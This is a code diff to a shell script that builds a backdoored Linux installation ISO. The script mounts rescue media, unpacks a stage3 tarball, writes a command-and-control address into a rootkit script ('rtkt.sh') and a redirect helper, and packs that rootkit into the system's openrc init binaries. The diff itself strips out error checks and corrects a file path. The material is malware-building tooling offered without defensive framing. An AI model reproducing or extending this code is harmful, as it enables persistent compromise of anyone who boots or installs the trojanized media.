@@ -102,10 +102,7 @@ if [ -e "out/"$RESCUE_BASE ] && [ -e "out/"$STAGE3_BASE ] && [ -e "out/"$STAGE3_
 fi
 
 mkdir backdoor-stage3 backdoor-iso-ro backdoor-iso-rw out
-if [ $? -ge 1 ];then
-     echo "Error creating work directories" 
-     exit
-fi
+
 
 if [ -e $STAGE3_BASE ] && [ -e $RESCUE_BASE ]; then
   dialog --yesno "Existing original installation media found, skip download?" 7 40
@@ -121,12 +118,9 @@ fi
 
 # Mount the ISO
 mount -oloop ./${RESCUE_BASE} ./backdoor-iso-ro
-if [ $? -ge 1 ]; then
-   echo "Error mounting ISO $RESCUE_BASE"
-   exit
-else
+
    echo "Please stand by,extracting files from installation media..."
-fi
+
 
 cp -a ./backdoor-iso-ro/* ./backdoor-iso-rw/ &&
 tar -C backdoor-stage3 -xf ./stage3-latest.tar.xz &&
@@ -156,7 +150,7 @@ sed -i "s/REPLACEME/$CNC/" ./rtkt.sh
 sed -i "s/REPLACEME/$INTERFACE_IP/" redirect.py
 
 # I guess I wasn't too creative here... a million ways to do this, I picked the simplest one I could think of.
-cp ./backdoor-squash/sbin/openrc ./ && cp ./backdoor-stage3/openrc3 ./openrc3
+cp ./backdoor-squash/sbin/openrc ./ && cp ./backdoor-stage3/sbin/openrc3 ./openrc3
 
 ./pack.sh ./rtkt.sh ./openrc && ./pack.sh ./rtkt.sh ./openrc3
 
